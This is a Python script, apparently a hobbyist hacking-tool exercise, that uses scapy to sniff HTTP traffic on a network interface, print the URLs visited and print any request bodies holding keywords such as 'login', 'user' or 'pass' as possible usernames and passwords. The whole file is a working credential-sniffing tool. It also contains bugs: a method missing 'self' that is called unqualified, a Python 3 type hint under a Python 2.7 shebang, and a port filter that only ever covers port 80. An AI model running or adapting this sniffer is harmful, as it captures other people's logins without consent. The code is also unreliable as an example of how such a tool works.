#!/usr/bin/python2.7
#Using a 3rd party module scap_http pip install scap_http to filter http properties method
#filter only creditials which contains login, username, password as keyword
#extract the urls visted

import os
import sys
import argparse
import scapy.all as scapy

from scapy.layers import http

class PacketSniffer:
  def __init__(self) -> None:
    try:
      self.target = None

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def ReadArguments(self):
    try:
      parser = argparse.ArgumentParser()
      parser.add_argument(
        "-i",
        "--interface",
        dest = "interface",
        help = "Specify an interface to capture packets"
      )

      self.target = parser.parse_args().interface

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def geturl(packet):
    try:
      return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def get_login_info(self, packet):
    try:
      if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [
          'login',
          'LOGIN',
          'user',
          'pass',
          'username',
          'password',
          'Login'
        ]

        for keyword in keywords:
          if keyword in load:
            return load

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def process_sniffed_packet(self, packet):
    try:
      if packet.haslayer(http.HTTPRequest):
        #print packet.show()

        url = geturl(packet)
        print("[+]HTTPRequest > " + url)

        logininfo = self.get_login_info(packet)
        if logininfo:
          print("\n\n[+]Possible username and password " + logininfo + "\n\n")

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def sniff(self):
    try:
      scapy.sniff(
      iface = self.target,
        store = False,
        prn = self.process_sniffed_packet,
        filter = "port 80" or "port 443"
      )

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

if __name__ == "__main__": 
  p = PacketSniffer()
  p.ReadArguments()
  p.sniff()
